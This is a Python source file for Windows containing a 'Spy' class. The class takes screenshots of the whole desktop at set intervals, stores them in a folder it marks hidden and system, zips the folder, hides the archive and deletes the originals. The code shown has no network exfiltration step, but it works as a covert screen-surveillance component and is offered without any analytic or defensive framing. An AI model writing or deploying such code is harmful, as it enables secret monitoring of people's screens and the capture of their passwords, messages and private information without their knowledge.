import time
import win32api
import win32con
import win32gui
import win32ui
import os
import subprocess
import shutil
from PIL import Image


class Spy:
    def __init__(self, screenshot_dir="screenshots") -> None:
        self.width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        self.height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        self.top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        self.left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        self.counter = 1
        self.screenshot_dir = screenshot_dir

        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
            subprocess.call(["attrib", "+h", "+s", self.screenshot_dir])

    def get_dimensions(self) -> tuple:
        return (self.width, self.height, self.top, self.left)

    def capture_screenshot(self, name='screenshot') -> None:
        jpeg_ = os.path.join(
            self.screenshot_dir, f"{name}_{self.counter}.jpeg")
        self.counter += 1

        hdesktop = win32gui.GetDesktopWindow()
        width, height, top, left = self.get_dimensions()

        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()

        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width, height), img_dc,
                      (left, top), win32con.SRCCOPY)

        screenshot.SaveBitmapFile(mem_dc, jpeg_)

        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())

        with Image.open(jpeg_) as img:
            img = img.convert("RGB")
            img.save(jpeg_, "JPEG", quality=50)

    def main(self, duration=None, interval_seconds=None) -> str:

        if os.path.exists(self.screenshot_dir):
            shutil.rmtree(self.screenshot_dir)
        os.makedirs(self.screenshot_dir)
        subprocess.call(["attrib", "+h", "+s", self.screenshot_dir])

        start_time = time.time()

        while time.time() - start_time < duration:
            self.capture_screenshot()
            time.sleep(interval_seconds)

        base_dir = os.path.abspath(self.screenshot_dir)
        zip_path = shutil.make_archive(
            base_name=base_dir, format="zip", root_dir=self.screenshot_dir)
        subprocess.call(["attrib", "+h", "+s", zip_path])

        shutil.rmtree(self.screenshot_dir)

        return zip_path
